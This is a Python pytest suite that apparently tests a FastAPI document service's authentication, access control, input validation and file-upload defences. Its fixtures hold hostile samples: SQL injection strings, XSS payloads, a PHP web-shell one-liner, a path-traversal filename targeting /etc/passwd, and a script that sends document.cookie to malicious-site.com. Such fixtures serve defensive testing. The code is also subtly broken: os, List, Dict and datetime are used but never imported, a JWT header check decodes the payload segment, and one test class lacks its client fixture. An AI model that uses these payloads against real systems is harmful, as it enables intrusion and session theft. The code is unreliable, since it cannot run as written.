"""
Comprehensive Security Testing Suite

Tests for authentication, authorization, input validation, and security controls:
- Authentication and authorization testing
- Input validation and sanitization
- SQL injection prevention
- XSS prevention
- CSRF protection
- Rate limiting
- Data encryption and secure storage
- Access control and permissions
- API security headers
- File upload security
"""

import pytest
import json
import time
import base64
import hashlib
import secrets
import re
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker
from unittest.mock import patch, Mock

from src.main import app
from src.core.database import get_db
from src.core.security import create_access_token, verify_password, hash_password
from src.models.user import User, UserRole
from src.models.organization import Organization
from src.models.document import Document, DocumentType
from src.core.config import settings


class TestAuthenticationSecurity:
    """Test authentication security controls"""

    @pytest.fixture
    def client(self, db_session):
        """Create test client"""
        def override_get_db():
            try:
                yield db_session
            finally:
                pass

        app.dependency_overrides[get_db] = override_get_db
        with TestClient(app) as test_client:
            yield test_client
        app.dependency_overrides.clear()

    @pytest.fixture
    def test_user_data(self, db_session):
        """Create test user with known credentials"""
        org = Organization(
            name="Security Test Org",
            plan_tier="free",
            max_users=5,
            storage_quota_gb=1.0,
            is_active=True
        )
        db_session.add(org)
        db_session.commit()
        db_session.refresh(org)

        user = User(
            email="security@test.com",
            first_name="Security",
            last_name="Test",
            role=UserRole.USER,
            organization_id=org.id,
            is_active=True,
            email_verified=True
        )
        user.set_password("SecurePassword123!")
        db_session.add(user)
        db_session.commit()
        db_session.refresh(user)

        return {"user": user, "organization": org}

    def test_strong_password_enforcement(self, client):
        """Test that strong password requirements are enforced"""
        weak_passwords = [
            "123",  # Too short
            "password",  # No numbers, no uppercase, no special chars
            "Password",  # No numbers, no special chars
            "password123",  # No uppercase, no special chars
            "PASSWORD123",  # No lowercase, no special chars
            "Password!",  # No numbers
            "Pass123!",  # Too short
        ]

        for weak_pwd in weak_passwords:
            response = client.post("/api/v1/auth/register", json={
                "email": f"test_{len(weak_pwd)}@example.com",
                "password": weak_pwd,
                "first_name": "Test",
                "last_name": "User",
                "organization_name": "Test Org"
            })
            assert response.status_code == 400
            assert "Password does not meet security requirements" in response.json()["detail"]

    def test_password_hashing_security(self, client, test_user_data):
        """Test that passwords are properly hashed and salted"""
        user = test_user_data["user"]

        # Password should be hashed, not stored in plain text
        assert user.hashed_password != "SecurePassword123!"
        assert len(user.hashed_password) > 50  # Hash should be substantial length

        # Hash should contain salt (bcrypt format)
        assert user.hashed_password.startswith("$2b$")

        # Verify password checking works
        assert user.check_password("SecurePassword123!") is True
        assert user.check_password("WrongPassword") is False

    def test_token_security(self, client, test_user_data):
        """Test JWT token security properties"""
        user = test_user_data["user"]

        # Login to get token
        response = client.post("/api/v1/auth/login", json={
            "email": "security@test.com",
            "password": "SecurePassword123!"
        })
        assert response.status_code == 200

        data = response.json()
        token = data["access_token"]

        # Token should be JWT format (header.payload.signature)
        parts = token.split('.')
        assert len(parts) == 3

        # Decode token payload (without verification)
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        # Token should contain user ID and expiration
        assert "sub" in payload
        assert "exp" in payload
        assert payload["sub"] == str(user.id)

        # Token should expire in reasonable time (not too long)
        exp_time = payload["exp"]
        current_time = time.time()
        assert exp_time - current_time < 86400  # Less than 24 hours
        assert exp_time - current_time > 300   # More than 5 minutes

    def test_invalid_token_handling(self, client):
        """Test handling of invalid tokens"""
        invalid_tokens = [
            "",  # Empty token
            "invalid.token.here",  # Invalid format
            "JWT_REDACTED",  # Invalid payload
            base64.urlsafe_b64encode(b'{"alg":"none"}').decode() + ".payload.signature",  # No algorithm
        ]

        for invalid_token in invalid_tokens:
            headers = {"Authorization": f"Bearer {invalid_token}"}
            response = client.get("/api/v1/auth/me", headers=headers)
            assert response.status_code == 401

    def test_token_expiration(self, client, test_user_data):
        """Test that expired tokens are rejected"""
        # Create expired token
        expired_token = create_access_token(
            data={"sub": str(test_user_data["user"].id)},
            expires_delta=-300  # Expired 5 minutes ago
        )

        headers = {"Authorization": f"Bearer {expired_token}"}
        response = client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 401
        assert "token has expired" in response.json()["detail"].lower()

    def test_concurrent_login_attempts(self, client, test_user_data):
        """Test handling of concurrent login attempts"""
        # Test multiple rapid login attempts
        responses = []
        for _ in range(10):
            response = client.post("/api/v1/auth/login", json={
                "email": "security@test.com",
                "password": "SecurePassword123!"
            })
            responses.append(response)

        # All should succeed (no rate limiting on login by default)
        for response in responses:
            assert response.status_code == 200

        # Test with wrong password
        failed_responses = []
        for _ in range(10):
            response = client.post("/api/v1/auth/login", json={
                "email": "security@test.com",
                "password": "WrongPassword"
            })
            failed_responses.append(response)

        # All should fail with 401
        for response in failed_responses:
            assert response.status_code == 401

    def test_session_management(self, client, test_user_data):
        """Test session management and invalidation"""
        # Login
        response = client.post("/api/v1/auth/login", json={
            "email": "security@test.com",
            "password": "SecurePassword123!"
        })
        token = response.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # Use token successfully
        response = client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 200

        # Change password (should invalidate existing tokens)
        response = client.post("/api/v1/auth/change-password", headers=headers, json={
            "current_password": "SecurePassword123!",
            "new_password": "NewSecurePassword456!"
        })
        assert response.status_code == 200

        # Old token should still work for JWT (stateless), but this could be enhanced
        # with token blacklisting if needed
        response = client.get("/api/v1/auth/me", headers=headers)
        # Note: JWT is stateless, so token still works unless blacklisting is implemented


class TestAuthorizationSecurity:
    """Test authorization and access control security"""

    @pytest.fixture
    def setup_multi_role_data(self, db_session):
        """Setup users with different roles"""
        org = Organization(
            name="Multi-Role Security Test Org",
            plan_tier="professional",
            max_users=10,
            storage_quota_gb=10.0,
            is_active=True
        )
        db_session.add(org)
        db_session.commit()
        db_session.refresh(org)

        # Create admin user
        admin_user = User(
            email="admin@test.com",
            first_name="Admin",
            last_name="User",
            role=UserRole.ADMIN,
            organization_id=org.id,
            is_active=True,
            email_verified=True
        )
        admin_user.set_password("AdminPassword123!")

        # Create regular user
        regular_user = User(
            email="regular@test.com",
            first_name="Regular",
            last_name="User",
            role=UserRole.USER,
            organization_id=org.id,
            is_active=True,
            email_verified=True
        )
        regular_user.set_password("UserPassword123!")

        # Create analyst user
        analyst_user = User(
            email="analyst@test.com",
            first_name="Analyst",
            last_name="User",
            role=UserRole.ANALYST,
            organization_id=org.id,
            is_active=True,
            email_verified=True
        )
        analyst_user.set_password("AnalystPassword123!")

        db_session.add_all([admin_user, regular_user, analyst_user])
        db_session.commit()

        return {
            "organization": org,
            "admin_user": admin_user,
            "regular_user": regular_user,
            "analyst_user": analyst_user
        }

    def get_auth_headers(self, user):
        """Get auth headers for user"""
        token = create_access_token(data={"sub": str(user.id)})
        return {"Authorization": f"Bearer {token}"}

    def test_role_based_access_control(self, client, setup_multi_role_data):
        """Test role-based access control"""
        data = setup_multi_role_data

        # Test admin access
        admin_headers = self.get_auth_headers(data["admin_user"])
        response = client.get("/api/v1/auth/users", headers=admin_headers)
        assert response.status_code == 200

        # Test regular user access (should be forbidden)
        user_headers = self.get_auth_headers(data["regular_user"])
        response = client.get("/api/v1/auth/users", headers=user_headers)
        assert response.status_code == 403

        # Test analyst access (should be forbidden)
        analyst_headers = self.get_auth_headers(data["analyst_user"])
        response = client.get("/api/v1/auth/users", headers=analyst_headers)
        assert response.status_code == 403

    def test_user_data_isolation(self, client, setup_multi_role_data, db_session):
        """Test that users can only access their own data"""
        data = setup_multi_role_data

        # Create documents for each user
        admin_doc = Document(
            title="Admin Secret Document",
            filename="admin_secret.txt",
            file_path="/test/admin_secret.txt",
            file_size_bytes=100,
            mime_type="text/plain",
            document_type=DocumentType.TEXT,
            organization_id=data["organization"].id,
            uploaded_by_user_id=data["admin_user"].id
        )

        user_doc = Document(
            title="User Secret Document",
            filename="user_secret.txt",
            file_path="/test/user_secret.txt",
            file_size_bytes=100,
            mime_type="text/plain",
            document_type=DocumentType.TEXT,
            organization_id=data["organization"].id,
            uploaded_by_user_id=data["regular_user"].id
        )

        db_session.add_all([admin_doc, user_doc])
        db_session.commit()

        # Test regular user can only see their documents
        user_headers = self.get_auth_headers(data["regular_user"])
        response = client.get("/api/v1/documents", headers=user_headers)
        assert response.status_code == 200

        documents = response.json()["items"]
        for doc in documents:
            assert doc["uploaded_by_user_id"] == data["regular_user"].id
            assert doc["title"] != "Admin Secret Document"

        # Test admin can see all documents
        admin_headers = self.get_auth_headers(data["admin_user"])
        response = client.get("/api/v1/documents", headers=admin_headers)
        assert response.status_code == 200

        documents = response.json()["items"]
        doc_titles = [doc["title"] for doc in documents]
        assert "Admin Secret Document" in doc_titles
        assert "User Secret Document" in doc_titles

    def test_cross_organization_access_prevention(self, client, db_session):
        """Test that users cannot access data from other organizations"""
        # Create two organizations
        org1 = Organization(name="Org 1", plan_tier="free", max_users=5, storage_quota_gb=1.0, is_active=True)
        org2 = Organization(name="Org 2", plan_tier="free", max_users=5, storage_quota_gb=1.0, is_active=True)
        db_session.add_all([org1, org2])
        db_session.commit()

        # Create users for each organization
        user1 = User(
            email="user1@org1.com",
            first_name="User",
            last_name="One",
            role=UserRole.USER,
            organization_id=org1.id,
            is_active=True,
            email_verified=True
        )
        user1.set_password("Password123!")

        user2 = User(
            email="user2@org2.com",
            first_name="User",
            last_name="Two",
            role=UserRole.USER,
            organization_id=org2.id,
            is_active=True,
            email_verified=True
        )
        user2.set_password("Password123!")

        db_session.add_all([user1, user2])
        db_session.commit()

        # Create document for org2
        org2_doc = Document(
            title="Org 2 Secret",
            filename="org2_secret.txt",
            file_path="/test/org2_secret.txt",
            file_size_bytes=100,
            mime_type="text/plain",
            document_type=DocumentType.TEXT,
            organization_id=org2.id,
            uploaded_by_user_id=user2.id
        )
        db_session.add(org2_doc)
        db_session.commit()

        # Try to access org2 document as org1 user
        user1_headers = self.get_auth_headers(user1)
        response = client.get(f"/api/v1/documents/{org2_doc.id}", headers=user1_headers)
        assert response.status_code == 404  # Should not find document from other org

    def test_privilege_escalation_prevention(self, client, setup_multi_role_data):
        """Test prevention of privilege escalation attempts"""
        data = setup_multi_role_data

        # Test regular user trying to access admin endpoints
        user_headers = self.get_auth_headers(data["regular_user"])

        # Try to access user management
        response = client.get("/api/v1/auth/users", headers=user_headers)
        assert response.status_code == 403

        # Try to access user statistics
        response = client.get("/api/v1/auth/statistics", headers=user_headers)
        assert response.status_code == 403

        # Try to update another user's role
        response = client.put(
            f"/api/v1/auth/users/{data['admin_user'].id}/role",
            headers=user_headers,
            json={"role": "admin"}
        )
        assert response.status_code == 403

        # Try to deactivate another user
        response = client.post(
            f"/api/v1/auth/users/{data['admin_user'].id}/deactivate",
            headers=user_headers
        )
        assert response.status_code == 403

    def test_inactive_user_access_denial(self, client, setup_multi_role_data):
        """Test that inactive users cannot access the system"""
        data = setup_multi_role_data

        # Deactivate user
        data["regular_user"].is_active = False
        db_session = next(app.dependency_overrides[get_db]())
        db_session.commit()

        # Try to login with inactive user
        response = client.post("/api/v1/auth/login", json={
            "email": "regular@test.com",
            "password": "UserPassword123!"
        })
        assert response.status_code == 401
        assert "inactive" in response.json()["detail"].lower()

        # Try to use existing token for inactive user
        token = create_access_token(data={"sub": str(data["regular_user"].id)})
        headers = {"Authorization": f"Bearer {token}"}
        response = client.get("/api/v1/auth/me", headers=headers)
        # Should still work with JWT unless additional validation is added
        # This test documents current behavior and could be enhanced


class TestInputValidationSecurity:
    """Test input validation and sanitization"""

    @pytest.fixture
    def client(self, db_session):
        """Create test client"""
        def override_get_db():
            try:
                yield db_session
            finally:
                pass

        app.dependency_overrides[get_db] = override_get_db
        with TestClient(app) as test_client:
            yield test_client
        app.dependency_overrides.clear()

    @pytest.fixture
    def auth_headers(self, test_admin_user):
        """Get auth headers"""
        token = create_access_token(data={"sub": str(test_admin_user.id)})
        return {"Authorization": f"Bearer {token}"}

    def test_sql_injection_prevention(self, client, auth_headers):
        """Test SQL injection attack prevention"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "1; DELETE FROM documents WHERE '1'='1",
            "UNION SELECT * FROM users --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'x'='x",
        ]

        # Test document search endpoint
        for payload in sql_injection_payloads:
            response = client.get(
                f"/api/v1/documents/search?query={payload}",
                headers=auth_headers
            )
            # Should not return 500 (internal server error)
            assert response.status_code in [200, 400, 422]

            # Should not contain error messages that leak database structure
            if response.status_code == 500:
                error_text = response.text.lower()
                database_errors = ["syntax error", "mysql", "postgresql", "sqlite", "column", "table"]
                for error in database_errors:
                    assert error not in error_text

    def test_xss_prevention(self, client, auth_headers):
        """Test XSS (Cross-Site Scripting) prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
        ]

        # Test document upload with XSS in description
        for payload in xss_payloads:
            response = client.post(
                "/api/v1/documents/upload",
                headers=auth_headers,
                data={"description": payload},
                files={"file": ("test.txt", "test content", "text/plain")}
            )

            # Should either succeed (with sanitization) or fail validation
            if response.status_code == 200:
                # If successful, check that XSS is sanitized in response
                response_text = response.text.lower()
                assert "<script>" not in response_text
                assert "javascript:" not in response_text

        # Test search with XSS
        for payload in xss_payloads:
            response = client.get(
                f"/api/v1/documents/search?query={payload}",
                headers=auth_headers
            )

            if response.status_code == 200:
                response_text = response.text.lower()
                assert "<script>" not in response_text

    def test_input_length_validation(self, client, auth_headers):
        """Test input length validation"""
        # Test extremely long input
        long_string = "a" * 10000

        # Test document search with long query
        response = client.get(
            f"/api/v1/documents/search?query={long_string}",
            headers=auth_headers
        )
        # Should be rejected due to length limits
        assert response.status_code in [400, 422, 414]

        # Test user update with long fields
        response = client.put(
            "/api/v1/auth/me",
            headers=auth_headers,
            json={
                "first_name": long_string,
                "last_name": "Smith"
            }
        )
        # Should be rejected due to length validation
        assert response.status_code in [400, 422]

    def test_special_character_handling(self, client, auth_headers):
        """Test handling of special characters"""
        special_chars = [
            "!@#$%^&*()_+-=[]{}|;':\",./<>?",
            "é à ö ñ 中文 العربية русский",
            "\x00\x01\x02\x03",  # Control characters
            "🚀🔥💡📊",  # Unicode emojis
        ]

        for chars in special_chars:
            # Test in search query
            response = client.get(
                f"/api/v1/documents/search?query={chars}",
                headers=auth_headers
            )
            # Should handle gracefully without crashing
            assert response.status_code in [200, 400, 422]

    def test_file_upload_security(self, client, auth_headers, temp_upload_dir):
        """Test file upload security controls"""
        # Test executable file upload
        executable_content = b"#!/bin/bash\necho 'malicious'"
        response = client.post(
            "/api/v1/documents/upload",
            headers=auth_headers,
            files={"file": ("malicious.sh", executable_content, "application/x-sh")}
        )
        # Should be rejected or processed safely
        assert response.status_code in [400, 422, 200]

        # Test very large file upload
        large_content = b"x" * (100 * 1024 * 1024)  # 100MB
        response = client.post(
            "/api/v1/documents/upload",
            headers=auth_headers,
            files={"file": ("large.txt", large_content, "text/plain")}
        )
        # Should be rejected due to size limits
        assert response.status_code in [400, 413, 422]

        # Test file with malicious name
        response = client.post(
            "/api/v1/documents/upload",
            headers=auth_headers,
            files={"file": ("../../../etc/passwd", b"test", "text/plain")}
        )
        # Should handle path traversal safely
        assert response.status_code in [400, 422, 200]

    def test_json_input_validation(self, client, auth_headers):
        """Test JSON input validation"""
        # Test malformed JSON
        response = client.post(
            "/api/v1/auth/login",
            data='{"email": "test@test.com", "password": "test"',  # Missing closing brace
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code == 422

        # Test JSON with unexpected fields
        response = client.post(
            "/api/v1/auth/login",
            json={
                "email": "test@test.com",
                "password": "test",
                "admin": True,  # Unexpected field
                "role": "admin"  # Unexpected field
            }
        )
        # Should ignore unexpected fields or reject
        assert response.status_code in [200, 422]

    def test_parameter_pollution_prevention(self, client, auth_headers):
        """Test HTTP parameter pollution prevention"""
        # Test duplicate parameters
        response = client.get(
            "/api/v1/documents/search?query=test&query=admin",
            headers=auth_headers
        )
        # Should handle gracefully without confusion
        assert response.status_code in [200, 400, 422]

        # Test parameter injection in different formats
        response = client.get(
            "/api/v1/documents/search?query=test&limit=10&limit=999",
            headers=auth_headers
        )
        # Should use consistent parameter handling
        assert response.status_code in [200, 400, 422]


class TestAPIHeadersSecurity:
    """Test API security headers and controls"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        with TestClient(app) as test_client:
            yield test_client

    def test_security_headers(self, client):
        """Test security headers are present"""
        response = client.get("/")

        headers = response.headers

        # Check for important security headers
        # Note: FastAPI doesn't set all of these by default, they should be added via middleware
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
        ]

        # At minimum, should have content type
        assert "content-type" in headers

    def test_cors_configuration(self, client):
        """Test CORS configuration"""
        # Test preflight request
        response = client.options(
            "/api/v1/auth/login",
            headers={
                "Origin": "https://malicious-site.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )

        # CORS should be properly configured
        # This test documents current behavior - CORS should be configured appropriately
        assert response.status_code in [200, 405, 404]

    def test_api_version_security(self, client):
        """Test API versioning and endpoint security"""
        # Test accessing deprecated or non-existent versions
        response = client.get("/api/v0/health")
        assert response.status_code in [404, 410]

        # Test accessing future version
        response = client.get("/api/v99/health")
        assert response.status_code == 404

    def test_error_information_disclosure(self, client):
        """Test that errors don't disclose sensitive information"""
        # Test 404 errors
        response = client.get("/api/v1/nonexistent-endpoint")
        assert response.status_code == 404
        assert "stack trace" not in response.text.lower()
        assert "internal server" not in response.text.lower()

        # Test authentication errors
        response = client.get("/api/v1/auth/me")
        assert response.status_code == 401
        # Should not reveal implementation details
        error_text = response.text.lower()
        assert "jwt" not in error_text or "token" in error_text

    def test_rate_limiting_headers(self, client):
        """Test rate limiting headers if implemented"""
        response = client.get("/health")

        # If rate limiting is implemented, headers should be present
        rate_limit_headers = [
            "X-RateLimit-Limit",
            "X-RateLimit-Remaining",
            "X-RateLimit-Reset",
        ]

        # This test documents expected behavior for rate limiting implementation
        # Current system may not have rate limiting headers


class TestEncryptionSecurity:
    """Test encryption and secure data handling"""

    def test_password_encryption_strength(self):
        """Test password encryption strength"""
        password = "TestPassword123!"

        # Hash password
        hashed = hash_password(password)

        # Hash should be different each time (due to salt)
        hashed2 = hash_password(password)
        assert hashed != hashed2

        # Both should verify correctly
        assert verify_password(password, hashed)
        assert verify_password(password, hashed2)

        # Wrong password should not verify
        assert not verify_password("WrongPassword", hashed)

        # Hash should contain proper bcrypt format
        assert hashed.startswith("$2b$")
        assert len(hashed) == 60  # bcrypt hash length

    def test_sensitive_data_handling(self):
        """Test handling of sensitive data in logs and responses"""
        # Test that passwords are not logged or exposed
        user = User(
            email="test@example.com",
            first_name="Test",
            last_name="User",
            hashed_password=hash_password("SecretPassword123!")
        )

        # Password should not be accessible in plain text
        assert not hasattr(user, 'password') or user.password is None
        assert hasattr(user, 'hashed_password')

        # String representation should not contain password
        user_str = str(user)
        assert "SecretPassword123!" not in user_str
        assert "hashed_password" not in user_str.lower()

    def test_token_generation_security(self):
        """Test JWT token generation security"""
        user_id = "123e4567-e89b-12d3-a456-426614174000"

        token = create_access_token(data={"sub": user_id})

        # Token should use strong algorithm
        parts = token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        # Should not use 'none' algorithm
        assert "alg" in header
        assert header["alg"] != "none"

        # Should use strong algorithm (HS256 or better)
        strong_algos = ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"]
        assert header["alg"] in strong_algos

    def test_session_id_generation(self):
        """Test session ID generation security"""
        # Generate multiple session IDs
        session_ids = [secrets.token_urlsafe(32) for _ in range(100)]

        # Should all be unique
        assert len(set(session_ids)) == 100

        # Should have sufficient entropy
        for session_id in session_ids:
            assert len(session_id) >= 32
            assert not session_id == session_id.lower()  # Mixed case for better entropy


class TestFileSecurity:
    """Test file handling security"""

    @pytest.fixture
    def client(self, db_session):
        """Create test client"""
        def override_get_db():
            try:
                yield db_session
            finally:
                pass

        app.dependency_overrides[get_db] = override_get_db
        with TestClient(app) as test_client:
            yield test_client
        app.dependency_overrides.clear()

    @pytest.fixture
    def auth_headers(self, test_admin_user):
        """Get auth headers"""
        token = create_access_token(data={"sub": str(test_admin_user.id)})
        return {"Authorization": f"Bearer {token}"}

    def test_file_type_validation(self, client, auth_headers):
        """Test file type validation"""
        dangerous_files = [
            ("malicious.exe", b"MZ\x90\x00", "application/x-executable"),
            ("script.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("exploit.html", b"<script>alert('xss')</script>", "text/html"),
        ]

        for filename, content, mime_type in dangerous_files:
            response = client.post(
                "/api/v1/documents/upload",
                headers=auth_headers,
                files={"file": (filename, content, mime_type)}
            )

            # Should reject dangerous file types or process safely
            if response.status_code == 200:
                # If accepted, verify safe processing
                assert response.json()["success"]
            else:
                # Should be rejected
                assert response.status_code in [400, 422]

    def test_file_content_scanning(self, client, auth_headers, temp_upload_dir):
        """Test file content scanning for malware"""
        # Create file with malware-like content
        malware_content = b"""
        <script>
            fetch('https://malicious-site.com/steal-data?cookie=' + document.cookie);
        </script>
        """

        file_path = os.path.join(temp_upload_dir, "test.html")
        with open(file_path, "wb") as f:
            f.write(malware_content)

        with open(file_path, "rb") as f:
            response = client.post(
                "/api/v1/documents/upload",
                headers=auth_headers,
                files={"file": ("test.html", f, "text/html")}
            )

        # Should handle malicious content safely
        if response.status_code == 200:
            # Content should be sanitized
            assert response.json()["success"]

    def test_file_storage_security(self, client, auth_headers, temp_upload_dir):
        """Test secure file storage"""
        # Test that files are stored securely
        test_content = b"Secret document content"

        with open(os.path.join(temp_upload_dir, "secret.txt"), "wb") as f:
            f.write(test_content)

        with open(os.path.join(temp_upload_dir, "secret.txt"), "rb") as f:
            response = client.post(
                "/api/v1/documents/upload",
                headers=auth_headers,
                files={"file": ("secret.txt", f, "text/plain")}
            )

        if response.status_code == 200:
            # File should be stored with secure name/location
            # This test documents expected secure storage behavior
            assert response.json()["success"]

    def test_file_access_control(self, client, auth_headers, db_session, test_admin_user, test_organization):
        """Test file access control"""
        # Upload a file
        test_content = b"Test content for access control"

        from io import BytesIO
        response = client.post(
            "/api/v1/documents/upload",
            headers=auth_headers,
            files={"file": ("access_test.txt", BytesIO(test_content), "text/plain")}
        )

        if response.status_code == 200:
            document_id = response.json()["document_id"]

            # Try to access file without authentication
            response = client.get(f"/api/v1/documents/{document_id}/download")
            assert response.status_code == 401

            # Test that only authorized users can access
            # (Implementation-specific testing would go here)


class TestSecurityMonitoring:
    """Test security monitoring and logging"""

    def test_failed_login_monitoring(self, client):
        """Test failed login attempts are monitored"""
        # Multiple failed login attempts
        for i in range(5):
            response = client.post("/api/v1/auth/login", json={
                "email": "nonexistent@test.com",
                "password": "wrongpassword"
            })
            assert response.status_code == 401

        # This test documents that failed login attempts should be monitored
        # In production, this would trigger alerts, account lockouts, etc.

    def test_suspicious_activity_detection(self, client, db_session):
        """Test detection of suspicious activity patterns"""
        # Create test user
        org = Organization(
            name="Security Monitoring Test Org",
            plan_tier="free",
            max_users=5,
            storage_quota_gb=1.0,
            is_active=True
        )
        db_session.add(org)
        db_session.commit()

        user = User(
            email="monitor@test.com",
            first_name="Monitor",
            last_name="Test",
            role=UserRole.USER,
            organization_id=org.id,
            is_active=True,
            email_verified=True
        )
        user.set_password("MonitorPassword123!")
        db_session.add(user)
        db_session.commit()

        # Test multiple rapid requests from same user
        token = create_access_token(data={"sub": str(user.id)})
        headers = {"Authorization": f"Bearer {token}"}

        # Rapid requests
        for _ in range(20):
            client.get("/api/v1/auth/me", headers=headers)

        # This test documents expected monitoring of rapid requests
        # In production, this would trigger rate limiting or alerts

    def test_audit_logging(self, client, db_session):
        """Test audit logging for security events"""
        # Test that security-relevant actions are logged
        # This test documents expected audit logging behavior

        # Login attempt (should be logged)
        response = client.post("/api/v1/auth/login", json={
            "email": "test@test.com",
            "password": "testpassword"
        })

        # Failed authentication (should be logged)
        response = client.post("/api/v1/auth/login", json={
            "email": "test@test.com",
            "password": "wrongpassword"
        })

        # This test would verify log entries in a real implementation
        # For now, it documents expected logging requirements


# Security test utilities
def generate_security_report(test_results: List[Dict]) -> str:
    """Generate security test report"""
    report = ["# Security Test Report\n"]
    report.append(f"Generated: {datetime.now().isoformat()}\n")

    categories = {
        "Authentication": [],
        "Authorization": [],
        "Input Validation": [],
        "File Security": [],
        "API Security": []
    }

    # Categorize test results
    for result in test_results:
        category = result.get("category", "Other")
        if category in categories:
            categories[category].append(result)

    for category, tests in categories.items():
        if tests:
            report.append(f"## {category}\n")
            for test in tests:
                status = "✅ PASS" if test["passed"] else "❌ FAIL"
                report.append(f"- {status} {test['name']}")
                if not test["passed"]:
                    report.append(f"  - Issue: {test['issue']}")
            report.append("")

    return "\n".join(report)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])